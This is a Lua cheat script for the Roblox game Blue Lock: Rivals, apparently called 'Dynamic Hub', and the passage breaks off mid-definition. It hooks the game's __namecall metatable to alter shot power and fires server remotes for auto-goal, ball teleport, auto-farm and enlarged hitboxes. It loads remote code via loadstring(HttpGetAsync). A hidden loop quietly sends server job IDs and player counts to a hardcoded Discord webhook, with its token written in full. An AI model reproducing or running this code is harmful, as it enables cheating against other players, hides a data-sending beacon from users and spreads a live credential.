local executor = identifyexecutor()
-- PC
if executor == "Wave" or executor == "AWP" or executor == "Synapse Z" or executor == "Seriality" or executor == "Argon" or executor == "Atlantis" or executor == "Xeno" or executor == "Solara" or executor == "Velocity" or executor == "Seliware" or executor == "Swift"
-- Mobile
or executor == "Fluxus" or executor == "Delta" or executor == "Arceus X" or executor == "Codex" or executor == "Cryptic" or executor == "Krnl"
then
    print("Executor ".. identifyexecutor())
local webh =
"https://discord.com/api/webhooks/1348879379186585710/HL6nj5UQrxSgDUzsgWHWhoGUbZCdb5Oj7dMZvrhI8XuBUY53-ImRh9LSylqR_zA7QZT6"
local httpService = game:GetService('HttpService')
local marketplaceService = game:GetService("MarketplaceService")
local notified = false
task.spawn(function()
    while true do
        if game.PrivateServerId == nil or game.PrivateServerId == "" then
            local playerCount = #game.Players:GetPlayers()
            if playerCount < 5 and not notified then
                local jobId = game.JobId
                local success, serverTime = pcall(function()
                    return game:GetService("Lighting"):GetMinutesAfterMidnight()
                end)
                local hours, minutes = 0, 0
                if success then
                    hours = math.floor(serverTime / 60)
                    minutes = math.floor(serverTime % 60)
                else
                end
                local formattedTime = string.format("%02d:%02d", hours, minutes)
                local placeId = game.PlaceId
                local placeInfo = { Name = "Unknown" }
                local success, info = pcall(function()
                    return marketplaceService:GetProductInfo(placeId)
                end)
                if success then
                    placeInfo = info
                else
                end
                local data = {
                    ["embeds"] = {
                        {
                            ["title"] = "Low Server",
                            ["fields"] = {
                                { ["name"] = "Players :",     ["value"] = string.format("```yaml\n%d/12\n```", playerCount),                                                                            ["inline"] = false },
                                { ["name"] = "Server Time :", ["value"] = string.format("```fix\n%s\n```", formattedTime),                                                                              ["inline"] = false },
                                { ["name"] = "Job-Id :",      ["value"] = string.format("```yaml\n%s\n```", jobId),                                                                                     ["inline"] = false },
                                { ["name"] = "game Name :",   ["value"] = string.format("```yaml\n%s\n```", placeInfo.Name),                                                                            ["inline"] = false },
                                { ["name"] = "Script :",      ["value"] = string.format("```lua\ngame:GetService(\"ReplicatedStorage\").__ServerBrowser:InvokeServer(\"teleport\", \"%s\")```", jobId), ["inline"] = false }
                            },
                            ["color"] = 0xFF0000
                        }
                    }
                }
                local success, response = pcall(function()
                    if syn then
                        return syn.request({
                            Url = webh,
                            Method = 'POST',
                            Headers = { ['Content-Type'] = 'application/json' },
                            Body = httpService:JSONEncode(data),
                        })
                    elseif request then
                        return request({
                            Url = webh,
                            Method = 'POST',
                            Headers = { ['Content-Type'] = 'application/json' },
                            Body = httpService:JSONEncode(data),
                        })
                    elseif http_request then
                        return http_request({
                            Url = webh,
                            Method = 'POST',
                            Headers = { ['Content-Type'] = 'application/json' },
                            Body = httpService:JSONEncode(data),
                        })
                    else
                        return nil
                    end
                end)
                if success and response and response.StatusCode == 200 then
                    notified = true
                else
                end
            elseif playerCount >= 5 then
                if notified then
                end
                notified = false
            end
        else
        end
        task.wait(21600)
    end
end)
if not game:IsLoaded() then repeat game.Loaded:Wait() until game:IsLoaded() end
getgenv().Config = {
    Save_Member = true,
}
_G.Check_Save_Setting = "CheckSaveSetting"
getgenv()['JsonEncode'] = function(msg)
    return game:GetService("HttpService"):JSONEncode(msg)
end
getgenv()['JsonDecode'] = function(msg)
    return game:GetService("HttpService"):JSONDecode(msg)
end
getgenv()['Check_Setting'] = function(Name)
    if not _G.Dis and not isfolder('Dynamic Hub Blue Lock Rivals') then
        makefolder('Dynamic Hub Blue Lock Rivals')
    end
    if not _G.Dis and not isfile('Dynamic Hub Blue Lock Rivals/' .. Name .. '.json') then
        writefile('Dynamic Hub Blue Lock Rivals/' .. Name .. '.json', JsonEncode(getgenv().Config))
    end
end
getgenv()['Get_Setting'] = function(Name)
    if not _G.Dis and isfolder('Dynamic Hub Blue Lock Rivals') and isfile('Dynamic Hub Blue Lock Rivals/' .. Name .. '.json') then
        getgenv().Config = JsonDecode(readfile('Dynamic Hub Blue Lock Rivals/' .. Name .. '.json'))
        return getgenv().Config
    elseif not _G.Dis then
        Check_Setting(Name)
    end
end
getgenv()['Update_Setting'] = function(Name)
    if not _G.Dis and isfolder('Dynamic Hub Blue Lock Rivals') and isfile('Dynamic Hub Blue Lock Rivals/' .. Name .. '.json') then
        writefile('Dynamic Hub Blue Lock Rivals/' .. Name .. '.json', JsonEncode(getgenv().Config))
    elseif not _G.Dis then
        Check_Setting(Name)
    end
end
Check_Setting(_G.Check_Save_Setting)
Get_Setting(_G.Check_Save_Setting)
if getgenv().Config.Save_Member then
    getgenv()['MyName'] = game.Players.LocalPlayer.Name
elseif getgenv().Config.Save_All_Member then
    getgenv()['MyName'] = "AllMember"
else
    getgenv()['MyName'] = "None"
    _G.Dis = true
end
Check_Setting(getgenv()['MyName'])
Get_Setting(getgenv()['MyName'])
getgenv().Config.Key = _G.wl_key
Update_Setting(getgenv()['MyName'])
game:GetService("Players").LocalPlayer.Idled:connect(function()
    game:GetService("VirtualUser"):Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
    wait(1)
    game:GetService("VirtualUser"):Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
end)
function TP(Pos)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Pos
end
function TP1(Pos)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = Pos
    end
end
function Goal()
    ball = game.workspace.Football
    local ball2 = ball.CFrame
    if ball then
        local GrabRangeDDDD = (ball2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
        .Magnitude
        if GrabRangeDDDD <= GrabRange then
            TP(ball.CFrame * CFrame.new(0, 2, 0))
        end
    end
end
function Goal2()
    local player = game.Players.LocalPlayer
    if not player or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
        return
    end
    ball = game.Workspace:FindFirstChild("Football")
    if ball then
        local ballPos = ball.Position
        local playerPos = player.Character.HumanoidRootPart.Position
        local distance = (ballPos - playerPos).Magnitude

        if distance <= GrabRange then
            TP1(ball.CFrame * CFrame.new(0, 2, 0))
        end
    end
end
function SaveGoalHome()
    local player = game.Players.LocalPlayer
    if not player or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
        return
    end
    ball = game.Workspace:FindFirstChild("Football")
    if ball then
        local ballPos = ball.Position
        local playerPos = game.workspace.PenaltyArea.Home.Position
        local distance = (ballPos - playerPos).Magnitude

        if distance <= 100 then
            TP1(ball.CFrame * CFrame.new(0, 2, 0))
        end
    end
end
function SaveGoalHome2()
    TP1(ball.CFrame * CFrame.new(0, 2, 0))
end

function GoalAutoFram()
    ball = game.workspace.Football
    if ball then
        TP(ball.CFrame * CFrame.new(0, 2, 0))
    end
end
function Rejoin()
    local TeleportService = game:GetService("TeleportService");
    local player = game.Players.LocalPlayer;
    if player then
        pcall(function()
            TeleportService:Teleport(game.PlaceId, player);
        end);
    end;
end;
local TweenService = game:GetService("TweenService")
_G.Logo = 83452741766028 --- เลข logo
if game.CoreGui:FindFirstChild("ImageButton") then
    game.CoreGui:FindFirstChild("ImageButton"):Destroy()
end
local TweenService = game:GetService("TweenService")
_G.Logo = 83452741766028 --- เลข logo
if game.CoreGui:FindFirstChild("ImageButton") then
    game.CoreGui:FindFirstChild("ImageButton"):Destroy()
end
local ScreenGui = Instance.new("ScreenGui")
local ImageButton = Instance.new("ImageButton")
local UICorner = Instance.new("UICorner")
local UIStroke = Instance.new("UIStroke")
local Shadow = Instance.new("ImageLabel")
local ClickSound = Instance.new("Sound")
ScreenGui.Name = "ImageButton"
ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ImageButton.Parent = ScreenGui
ImageButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ImageButton.BackgroundTransparency = 0.8
ImageButton.BorderSizePixel = 0
ImageButton.Position = UDim2.new(0.4875, 0, 0.010, 0)
ImageButton.Size = UDim2.new(0, 52, 0, 50)
ImageButton.Draggable = false
ImageButton.Image = "http://www.roblox.com/asset/?id=" .. (_G.Logo)
ImageButton.ImageTransparency = 0.4
UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = ImageButton
UIStroke.Parent = ImageButton
UIStroke.Thickness = 2
UIStroke.Color = Color3.fromRGB(255, 255, 255)
UIStroke.Transparency = 1
ClickSound.Parent = ImageButton
ClickSound.SoundId = "rbxassetid://130785805"
ClickSound.Volume = 1
local function playClickAnimation()
    local originalSize = ImageButton.Size
    local TweenSizeUp = TweenService:Create(ImageButton, TweenInfo.new(0.1), { Size = UDim2.new(0, 52, 0, 50) })
    local TweenSizeDown = TweenService:Create(ImageButton, TweenInfo.new(0.1), { Size = originalSize })
    TweenSizeUp:Play()
    TweenSizeUp.Completed:Connect(function()
        TweenSizeDown:Play()
    end)
end
ImageButton.MouseButton1Down:Connect(function()
    ClickSound:Play()
    playClickAnimation()
    game:GetService("VirtualInputManager"):SendKeyEvent(true, "Insert", false, game)
    game:GetService("VirtualInputManager"):SendKeyEvent(false, "Insert", false, game)
end)
local Library = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/L3nyFromV3rm/Leny-UI/refs/heads/main/Library.lua", true))()
Library.new({
	sizeX = 770,
	sizeY = 600,
	title = "Dynamic Hub",
	tabWidth = 200, -- (72 for icons only)
	PrimaryBackgroundColor = Library.Theme.PrimaryBackgroundColor,
	SecondaryBackgroundColor = Library.Theme.SecondaryBackgroundColor,
	TertiaryBackgroundColor = Library.TTabBackgroundColor,
	PrimaryTextColor = Library.Theme.PrimaryTextColor,
    --[[]
	SecondaryTextColor = Library.Theme.Secondheme.TertiaryBackgroundColor,
    --]]
	TabBackgroundColor = Library.Theme.aryTextColor,
	PrimaryColor = Library.Theme.PrimaryColor,
	ScrollingBarImageColor = Library.Theme.ScrollingBarImageColor,
	Line = Library.Theme.Line,
})
local Main = Library:createLabel({text = "Blue Lock: Rivals"})
local Tab = Library:createTab({
	text = "Exploits",
	icon = "124718082122263", -- 20x20 icon you want here
})
local Miscellaneous = Library:createTab({
	text = "Miscellaneous",
	icon = "10723375250", -- 20x20 icon you want here
})
local Miscellaneousv2 = Miscellaneous:createSubTab({
	text = "General",
	sectionStyle = "Double", -- Make the page a single section style or double, "Single", "Double"
})
local General = Tab:createSubTab({
	text = "General",
	sectionStyle = "Double", -- Make the page a single section style or double, "Single", "Double"
})
local JoinTeam = Tab:createSubTab({
	text = "Join Team",
	sectionStyle = "Single", -- Make the page a single section style or double, "Single", "Double"
})
local Spin = Tab:createSubTab({
	text = "Spin",
	sectionStyle = "Single", -- Make the page a single section style or double, "Single", "Double"
})
local Main = General:createSection({
	text = "Main",
	position = "Left", -- Left/Right
})
Main:createToggle({
	text = "Auto Grab Ball",
	state = getgenv().Config["Auto Grab Ball"] or false,
	callback = function(Value)
        _G['Auto Grab Ball'] = Value
        getgenv().Config["Auto Grab Ball"] = Value
        Update_Setting(getgenv()['MyName'])
	end
})
spawn(function()
    while wait() do
        if _G['Auto Grab Ball'] then
            pcall(function()
                Goal2()
            end)
        end
    end
end)
Main:createSlider({
	text = "Grab Ball Range",
    default = getgenv().Config["Grab Range"] or 150,
	min = 50,
	max = 1500,
	step = 0,
	callback = function(Value)
        GrabRange = Value
        getgenv().Config["Grab Range"] = Value
        Update_Setting(getgenv()['MyName'])
	end
})
Main:createToggle({
	text = "Auto Shoot Ball",
	state = getgenv().Config["Auto Shoot Ball"] or false,
	callback = function(Value)
        _G['Auto Shoot Ball'] = Value
        getgenv().Config["Auto Shoot Ball"] = Value
        Update_Setting(getgenv()['MyName'])
	end
})
spawn(function()
    while task.wait() do
        if _G.Goal then
            pcall(function()
                local football = workspace:FindFirstChild("Football")
                local goal = workspace.Goals[tostring(game.Players.LocalPlayer.Team)]
                if football and goal then
                    if (football.Position - goal.Position).Magnitude < 5 then
                        repeat
                            task.wait()
                        until not football or (football.Position - goal.Position).Magnitude > 5
                    end
                    if football then
                        local isOwner = tostring(football.Char.Value) == game.Players.LocalPlayer.Name
                        local playerPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
                        hitboxCFrame = game.Players.LocalPlayer.Character.Hitbox.CFrame
                        if isOwner then
                            football.CFrame = goal.CFrame
                        elseif (football.Position - playerPosition).Magnitude < 50 then
                        end
                    end
                end
            end)
        end
    end
end)
spawn(function()
    while wait() do
        if _G['Auto Shoot Ball'] then
            pcall(function()
                for _, player in pairs(game.Players:GetPlayers()) do
                    local character = player.Character
                    if character and character:FindFirstChild("Football") then
                        _G.Goal = true
                        local args = {
                            [1] = ShootP,
                            [4] = Vector3.new(-0.6945253610610962, -0.5055715441703796, 0.5118905305862427)
                        }
                        game:GetService("ReplicatedStorage").Packages.Knit.Services.BallService.RE.Shoot:FireServer(
                        unpack(args))
                    end
                end
            end)
        end
    end
end)
Main:createToggle({
	text = "Enabled Power Shoot",
	state = getgenv().Config["Enabled Power Shoot"] or false,
	callback = function(Value)
        _G['Enabled Power Shoot'] = Value
        getgenv().Config["Enabled Power Shoot"] = Value
        Update_Setting(getgenv()['MyName'])
	end
})
local gg = getrawmetatable(game)
local old = gg.__namecall
setreadonly(gg, false)
gg.__namecall = newcclosure(function(self, ...)
    local method = getnamecallmethod()
    local args = { ... }
    if method == "FireServer" and self.Name == "Shoot" then
        if _G['Enabled Power Shoot'] then
            args[1] = getgenv().Config["Shoot Power"]
            return old(self, unpack(args))
        end
    end
    return old(self, ...)
end)
Main:createSlider({
	text = "Shoot Power",
    default = getgenv().Config["Shoot Power"] or 110,
	min = 50,
	max = 10000,
	step = 0,
	callback = function(Value)
        ShootP = Value
        getgenv().Config["Shoot Power"] = Value
        Update_Setting(getgenv()['MyName'])
	end
})
Main:createToggle({
	text = "Auto Goal Keeper",
	state = getgenv().Config["Auto Goal Keeper"] or false,
	callback = function(Value)
        _G['Auto Goal Keeper'] = Value
        getgenv().Config["Auto Goal Keeper"] = Value
        Update_Setting(getgenv()['MyName'])
	end
})
spawn(function()
    while wait() do
        if _G['Auto Goal Keeper'] then
            pcall(function()
                local ball = Workspace:FindFirstChild("Football")
                if ball then
                    local ballPos = ball.Position
                    local ballCFrame = ball.CFrame
                    local playerHRP = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                    if playerHRP then
                        local playerPos = playerHRP.Position
                        local Home = game.Workspace.PenaltyArea.Home.Position
                        local distance = (ballPos - playerPos).Magnitude
                        local distanceHome = (ballPos - Home).Magnitude
                        if distanceHome <= 150 then
                            playerHRP.CFrame = ballCFrame
                        elseif distance <= 100 then
                        end
                    end
                end
            end)
        end
    end
end)
local Assist = General:createSection({
	text = "Assist",
	position = "Right", -- Left/Right
})
Assist:createToggle({
	text = "Auto Steal Ball",
	state = getgenv().Config["Auto Steal Ball"] or false,
	callback = function(Value)
        _G['Auto Steal Ball'] = Value
        getgenv().Config["Auto Steal Ball"] = Value
        Update_Setting(getgenv()['MyName'])
	end
})
spawn(function()
    while wait() do
        if _G['Auto Steal Ball'] then
            pcall(function()
                for i, v in pairs(workspace:GetDescendants()) do
                    if v.Name == "Football" then
                        ball = v.Position
                        if (ball - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= Radius then
                            game:service("VirtualInputManager"):SendKeyEvent(true, "E", false, game)
                        end
                    end
                end
            end)
        end
    end
end)
Assist:createSlider({
	text = "Radius",
    default = getgenv().Config["Radius"] or 25,
	min = 10,
	max = 40,
	step = 0,
	callback = function(Value)
        Radius = Value
        getgenv().Config["Radius"] = Value
        Update_Setting(getgenv()['MyName'])
	end
})
Assist:createToggle({
	text = "Auto Dribble",
	state = getgenv().Config["Auto Dribble"] or false,
	callback = function(Value)
        _G['Auto Dribble'] = Value
        getgenv().Config["Auto Dribble"] = Value
        Update_Setting(getgenv()['MyName'])
	end
})
local AutoDribbleSettings = getgenv().AutoDribbleSettings or { Enabled = true, range = 22 }
getgenv().AutoDribbleSettings = AutoDribbleSettings
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local BallService = ReplicatedStorage.Packages.Knit.Services.BallService.RE.Dribble
local Animations = require(ReplicatedStorage.Assets.Animations)
if not BallService or not Animations then return end
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
local Humanoid = Character:WaitForChild("Humanoid")
local function LoadDribbleAnimation(style)
    if not Animations.Dribbles[style] then return nil end
    local animation = Instance.new("Animation")
    animation.AnimationId = Animations.Dribbles[style]
    return Humanoid:LoadAnimation(animation)
end
local function IsSliding(player)
    if player == LocalPlayer then return false end
    local character = player.Character
    if not character then return false end

    local slidingValue = character.Values and character.Values.Sliding
    if slidingValue and slidingValue.Value == true then return true end

    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid and humanoid.MoveDirection.Magnitude > 0 and humanoid.WalkSpeed == 0 then
        return true
    end
    return false
end
local function IsOpponent(player)
    if not LocalPlayer.Team or not player.Team then return false end
    return LocalPlayer.Team ~= player.Team
end
local function AutoDribble(distance)
    if not AutoDribbleSettings.Enabled or not Character.Values.HasBall.Value then return end
    BallService:FireServer()
    local style = LocalPlayer.PlayerStats.Style.Value
    local animation = LoadDribbleAnimation(style)
    if animation then
        animation:Play()
        animation:AdjustSpeed(math.clamp(1 + (10 - distance) / 10, 1, 2))
    end
    local Ball = workspace:FindFirstChild("Football")
    if Ball then
        Ball.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
        Ball.CFrame = Character.HumanoidRootPart.CFrame * CFrame.new(0, -2.5, 0)
    end
end
RunService.Heartbeat:Connect(function()
    if not _G['Auto Dribble'] then return end
    if not AutoDribbleSettings.Enabled or not Character or not HumanoidRootPart then return end
    for _, player in pairs(Players:GetPlayers()) do
        if IsOpponent(player) and IsSliding(player) then
            local enemyHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
            if enemyHRP then
                local distance = (enemyHRP.Position - HumanoidRootPart.Position).Magnitude
                if distance < AutoDribbleSettings.range then
                    AutoDribble(distance)
                    break
                end
            end
        end
    end
end)
local Hitbox = General:createSection({
	text = "Hitbox",
	position = "Left", -- Left/Right
})
Hitbox:createToggle({
	text = "Enabled Hitbox",
	state = getgenv().Config["Enabled Hitbox"] or false,
	callback = function(Value)
        _G['Enabled Hitbox'] = Value
        getgenv().Config["Enabled Hitbox"] = Value
        Update_Setting(getgenv()['MyName'])
        if _G['Enabled Hitbox'] then
            if LOL then
                LOL.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
            end
        else
            if LOL then
                LOL.Size = Vector3.new(2.5, 2.5, 2.5)
            end
        end
	end
})
spawn(function()
    while wait() do
        if _G['Enabled Hitbox'] then
            pcall(function()
                for i, v in pairs(workspace:GetDescendants()) do
                    if v.Name == "Football" and v:FindFirstChild("Hitbox") then
                        v.Hitbox.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
                    end
                end
            end)
        end
    end
end)
spawn(function()
    while wait() do
        if not _G['Enabled Hitbox'] then
            pcall(function()
                for i, v in pairs(workspace:GetDescendants()) do
                    if v.Name == "Football" and v:FindFirstChild("Hitbox") then
                        v.Hitbox.Size = Vector3.new(2.5, 2.5, 2.5)
                    end
                end
                if LOL then
                    LOL.Size = Vector3.new(2.5, 2.5, 2.5)
                end
            end)
        end
    end
end)
Hitbox:createToggle({
	text = "Show Ball Hitbox",
	state = getgenv().Config["Show Ball Hitbox"] or false,
	callback = function(Value)
        _G['Show Ball Hitbox'] = Value
        getgenv().Config["Show Ball Hitbox"] = Value
        Update_Setting(getgenv()['MyName'])
	end
})
LOL = nil
local football = nil
local function findFootball()
    if not football then
        for _, v in pairs(workspace:GetDescendants()) do
            if v.Name == "Football" and v:IsA("BasePart") then
                football = v
                break
            end
        end
    end
end
local function createLOL()
    LOL = workspace:FindFirstChild("LOL")
    if not LOL then
        LOL = Instance.new("Part")
        LOL.Name = "LOL"
        LOL.Parent = workspace
        LOL.Material = Enum.Material.ForceField
        LOL.Shape = Enum.PartType.Ball
        LOL.Anchored = true
        LOL.CanCollide = false
        LOL.CastShadow = false
        LOL.Color = Color3.fromRGB(0, 255, 0)
    end
    if _G["Enabled Hitbox"] then
        LOL.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
    else
        LOL.Size = Vector3.new(2.5, 2.5, 2.5)
    end
end
spawn(function()
    while wait() do
        createLOL()
        findFootball()
        if _G['Show Ball Hitbox'] then
            if football then
                LOL.Position = football.Position
                LOL.Transparency = 0.5
            end
        else
            if LOL then
                LOL.Transparency = 1
            end
        end
    end
end)
Hitbox:createSlider({
	text = "Hitbox Size",
    default = getgenv().Config["Hitbox Size"] or 25,
	min = 10,
	max = 40,
	step = 0,
	callback = function(Value)
        HitboxSize = Value
        getgenv().Config["Hitbox Size"] = Value
        Update_Setting(getgenv()['MyName'])
        if _G["Enabled Hitbox"] then
            if LOL then
                LOL.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
            end
        end
	end
})
local OP = General:createSection({
	text = "OP",
	position = "Right", -- Left/Right
})
OP:createToggle({
	text = "Auto Farm",
	state = getgenv().Config["Auto Farm"] or false,
	callback = function(Value)
        _G['Auto Farm'] = Value
        getgenv().Config["Auto Farm"] = Value
        Update_Setting(getgenv()['MyName'])
	end
})
spawn(function()
    while task.wait() do
        if _G['Auto Farm'] then
            pcall(function()
                GoalAutoFram()
                local player = game.Players.LocalPlayer
                local character = player.Character
                if character then
                    local football = character:FindFirstChild("Football")
                    if football then
                        _G.Goal = true
                        task.wait(0.1)
                        character.HumanoidRootPart.CFrame = CFrame.new(-241, 11, -51)
                        local direction = character.HumanoidRootPart.CFrame.LookVector
                        local args = {
                            [1] = 110,
                            [4] = direction
                        }
                        game:GetService("ReplicatedStorage").Packages.Knit.Services.BallService.RE.Shoot:FireServer(
                        unpack(args))
                    else
                    end
                end
            end)
        end
    end
end)
spawn(function()
    while wait() do
        if _G['Auto Farm'] then
            pcall(function()
                for _, player in pairs(game.Players:GetPlayers()) do
                    local character = player.Character
                    if character and character:FindFirstChild("Football") then
                        _G.Goal = true
                        wait(0.1)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(38, 30, -50)
                        wait(0.1)
                        local args = {
                            [1] = 110,
                            [4] = Vector3.new(-0.6945253610610962, -0.5055715441703796, 0.5118905305862427)
                        }
                        game:GetService("ReplicatedStorage").Packages.Knit.Services.BallService.RE.Shoot:FireServer(
                        unpack(args))
                    end
                end
            end)
        end
    end
end)
OP:createToggle({
	text = "Auto Farm V2",
	state = getgenv().Config["Auto Farm V2"] or false,
	callback = function(Value)
        _G['Auto Farm V2'] = Value
        getgenv().Config["Auto Farm V2"] = Value
        Update_Setting(getgenv()['MyName'])
	end
})
spawn(function()
    while task.wait() do
        if _G.Goalv2 then
            pcall(function()
                local football = workspace:FindFirstChild("Football")
                local goal = workspace.Goals[tostring(game.Players.LocalPlayer.Team)]
                if football and goal then
                    if (football.Position - goal.Position).Magnitude < 5 then
                        repeat
                            task.wait()
                        until not football or (football.Position - goal.Position).Magnitude > 5
                    end
                    if football then
                        local isOwner = tostring(football.Char.Value) == game.Players.LocalPlayer.Name
                        local playerPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
                        hitboxCFrame = game.Players.LocalPlayer.Character.Hitbox.CFrame
                        if isOwner then
                            football.CFrame = goal.CFrame
                        elseif (football.Position - playerPosition).Magnitude > 1 then
                            football.CFrame = hitboxCFrame * CFrame.new(0, -2, 0)
                        end
                    end
                end
            end)
        end
    end
end)
spawn(function()
    while task.wait() do
        if _G['Auto Farm V2'] then
            pcall(function()
                _G.Goalv2 = true
                local player = game.Players.LocalPlayer
                local character = player.Character
                if character then
                    local football = character:FindFirstChild("Football")
                    if football then
                        task.wait(0.1)
                        character.HumanoidRootPart.CFrame = CFrame.new(-241, 11, -51)
                        local direction = character.HumanoidRootPart.CFrame.LookVector
                        local args = {
                            [1] = 110,
                            [4] = direction
                        }
                        game:GetService("ReplicatedStorage").Packages.Knit.Services.BallService.RE.Shoot:FireServer(
                        unpack(args))
                    else
                    end
                end
            end)
        end
    end
end)
spawn(function()
    while wait() do
        if _G['Auto Farm V2'] then
            pcall(function()
                _G.Goalv2 = true
                for _, player in pairs(game.Players:GetPlayers()) do
                    local character = player.Character
                    if character and character:FindFirstChild("Football") then
                        wait(0.1)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(38, 30, -50)
                        wait(0.1)
                        local args = {
                            [1] = 110,
                            [4] = Vector3.new(-0.6945253610610962, -0.5055715441703796, 0.5118905305862427)
                        }
                        game:GetService("ReplicatedStorage").Packages.Knit.Services.BallService.RE.Shoot:FireServer(
                        unpack(args))
                    end
                end
            end)
        end
    end
end)
spawn(function()
    while wait() do
        if not _G['Auto Farm'] or _G['Auto Shoot Ball'] or _G['Auto Farm V2'] then
            pcall(function()
                _G.Goal = false
                _G.Goalv2 = false
            end)
        end
    end
end)
local Team = JoinTeam:createSection({
	text = "Team",
})
Team:createToggle({
	text = "Auto Join Team",
	state = getgenv().Config["Auto Join Team"] or false,
	callback = function(Value)
        _G['Auto Join Team'] = Value
        getgenv().Config["Auto Join Team"] = Value
        Update_Setting(getgenv()['MyName'])
	end
})
spawn(function()
    while wait(1) do
        if _G['Auto Join Team'] then
            pcall(function()
                if game:GetService("Players").LocalPlayer.Team.Name == "Visitor" then
                    if _G['Join Team'] == "Home" and _G['Position'] == "CF" then
                        local args = {
                            [1] = "Home",
                            [2] = "CF"
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit")
                            :WaitForChild("Services"):WaitForChild("TeamService"):WaitForChild("RE"):WaitForChild(
                        "Select"):FireServer(unpack(args))
                    elseif _G['Join Team'] == "Home" and _G['Position'] == "LW" then
                        local args = {
                            [1] = "Home",
                            [2] = "LW"
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit")
                            :WaitForChild("Services"):WaitForChild("TeamService"):WaitForChild("RE"):WaitForChild(
                        "Select"):FireServer(unpack(args))
                    elseif _G['Join Team'] == "Home" and _G['Position'] == "RW" then
                        local args = {
                            [1] = "Home",
                            [2] = "RW"
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit")
                            :WaitForChild("Services"):WaitForChild("TeamService"):WaitForChild("RE"):WaitForChild(
                        "Select"):FireServer(unpack(args))
                    elseif _G['Join Team'] == "Home" and _G['Position'] == "CM" then
                        local args = {
                            [1] = "Home",
                            [2] = "CM"
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit")
                            :WaitForChild("Services"):WaitForChild("TeamService"):WaitForChild("RE"):WaitForChild(
                        "Select"):FireServer(unpack(args))
                    elseif _G['Join Team'] == "Home" and _G['Position'] == "GK" then
                        local args = {
                            [1] = "Home",
                            [2] = "GK"
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit")
                            :WaitForChild("Services"):WaitForChild("TeamService"):WaitForChild("RE"):WaitForChild(
                        "Select"):FireServer(unpack(args))
                    elseif _G['Join Team'] == "Amay" and _G['Position'] == "CF" then
                        local args = {
                            [1] = "Away",
                            [2] = "CF"
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit")
                            :WaitForChild("Services"):WaitForChild("TeamService"):WaitForChild("RE"):WaitForChild(
                        "Select"):FireServer(unpack(args))
                    elseif _G['Join Team'] == "Amay" and _G['Position'] == "LW" then
                        local args = {
                            [1] = "Away",
                            [2] = "LW"
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit")
                            :WaitForChild("Services"):WaitForChild("TeamService"):WaitForChild("RE"):WaitForChild(
                        "Select"):FireServer(unpack(args))
                    elseif _G['Join Team'] == "Amay" and _G['Position'] == "RW" then
                        local args = {
                            [1] = "Away",
                            [2] = "RW"
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit")
                            :WaitForChild("Services"):WaitForChild("TeamService"):WaitForChild("RE"):WaitForChild(
                        "Select"):FireServer(unpack(args))
                    elseif _G['Join Team'] == "Amay" and _G['Position'] == "CM" then
                        local args = {
                            [1] = "Away",
                            [2] = "CM"
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit")
                            :WaitForChild("Services"):WaitForChild("TeamService"):WaitForChild("RE"):WaitForChild(
                        "Select"):FireServer(unpack(args))
                    elseif _G['Join Team'] == "Amay" and _G['Position'] == "GK" then
                        local args = {
                            [1] = "Away",
                            [2] = "GK"
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit")
                            :WaitForChild("Services"):WaitForChild("TeamService"):WaitForChild("RE"):WaitForChild(
                        "Select"):FireServer(unpack(args))
                    end
                end
            end)
        end
    end
end)
Team:createDropdown({
	text = "Team",
	list = {"Home", "Amay"},
	default = {"Home"},
	multiple = false, -- choose multiple from list, makes callback value return a table now
	callback = function(Value)
        _G['Team'] = Value
        getgenv().Config["Team"] = Value
        Update_Setting(getgenv()['MyName'])
	end
}) 
local Position = {
    "CF",
    "LW",
    "RW",
    "CM",
    "GK"
}
Team:createDropdown({
	text = "Position",
	list = Position,
	default = {"CF"},
	multiple = false, -- choose multiple from list, makes callback value return a table now
	callback = function(Value)
        _G['Position'] = Value
        getgenv().Config["Position"] = Value
        Update_Setting(getgenv()['MyName'])
	end
})
local string = Spin:createSection({
	text = "Spin",
})
local GLITCH_Ssg = string:createToggle({
	text = "Auto Spin Styles",
